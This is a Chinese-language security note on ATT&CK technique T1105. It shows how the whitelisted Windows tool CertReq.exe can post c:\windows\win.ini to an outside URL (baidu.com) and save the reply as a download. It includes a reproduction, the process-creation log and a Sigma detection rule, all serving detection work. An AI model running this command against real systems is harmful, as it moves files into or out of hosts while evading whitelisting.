# T1105-win-入口工具转移-CertReq.exe(白名单)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。

## 测试案例
CertReq.exe用于从证书颁发机构请求证书 (CA) ，从CA检索对以前的请求的响应，从.inf文件创建新请求，以接受和安装对请求的响应，以从现有CA证书或请求构造交叉认证或限定的次序请求， 并签署交叉认证或限定的下级请求。

**路径:**
```
- C:\Windows\System32\certreq.exe
- C:\Windows\SysWOW64\certreq.exe
```

将来自www.baidu.com的HTTP POST的响应内容保存到端点上，输出output.txt在当前目录中。
```
CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
```

用例：从 Internet 下载文件
所需权限：用户
操作系统：Windows Vista、Windows 7、Windows 8、Windows 8.1、Windows 10
## 检测日志

windows安全日志

## 测试复现

```
C:\Users\liyang\Desktop\asptest>CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
OK
HTTP/1.1 200 OK
Cache-Control: max-age=86400
Date: Mon, 18 Apr 2022 06:28:15 GMT
Content-Length: 19825
Content-Type: text/html
Expires: Tue, 19 Apr 2022 06:28:15 GMT
Last-Modified: Wed, 10 Mar 2021 06:27:44 GMT
Accept-Ranges: bytes
ETag: "4d71-5bd28c3bf7800"
P3P: CP=" OTI DSP COR IVA OUR IND COM "
Server: Apache
Set-Cookie: BAIDUID=4305E8F795AE7B64177F5105CD755190:FG=1; expires=Tue, 18-Apr-23 06:28:15 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1
Vary: Accept-Encoding,User-Agent
```

## 测试留痕
```
已创建新进程。

  

创建者主题:

安全 ID: DESKTOP-PT656L6\liyang

帐户名: liyang

帐户域: DESKTOP-PT656L6

登录 ID: 0x47126

  

目标主题:

安全 ID: NULL SID

帐户名: -

帐户域: -

登录 ID: 0x0

  

进程信息:

新进程 ID: 0x1778

新进程名称: C:\Windows\System32\certreq.exe

令牌提升类型: %%1938

强制性标签: Mandatory Label\Medium Mandatory Level

创建者进程 ID: 0x24b4

创建者进程名称: C:\Windows\System32\cmd.exe

进程命令行: CertReq  -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
```
## 检测方法/思路
参考Sigma官方规则:
```yml
title: Suspicious Certreq Command to Download

id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b

status: experimental

description: Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files

author: Christian Burkard

date: 2021/11/24

references:

- https://lolbas-project.github.io/lolbas/Binaries/Certreq/

logsource:

category: process_creation

product: windows

detection:

selection:

Image|endswith: '\certreq.exe'

CommandLine|contains|all:

- ' -Post '

- ' -config '

- ' http'

- ' C:\windows\win.ini '

condition: selection

fields:

- CommandLine

- ParentCommandLine

tags:

- attack.command_and_control

- attack.t1105

falsepositives:

- Unlikely

level: high

-   [](https://github.com/ "GitHub")

```

### 建议
从Sigma给出的规则来看，更多的是对进程和命令行参数进行监测，只要出现其中一个命令参数即告警。
## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

CertReq.exe

<https://lolbas-project.github.io/lolbas/Binaries/Certreq/>

certreq使用方法

<https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certreq_1>

Sigma:win_susp_certreq_download

<https://github.com/SigmaHQ/sigma/blob/eb8c9c046b86e7d412bdcc3235693fa1c00f70d6/rules/windows/process_creation/win_susp_certreq_download.yml>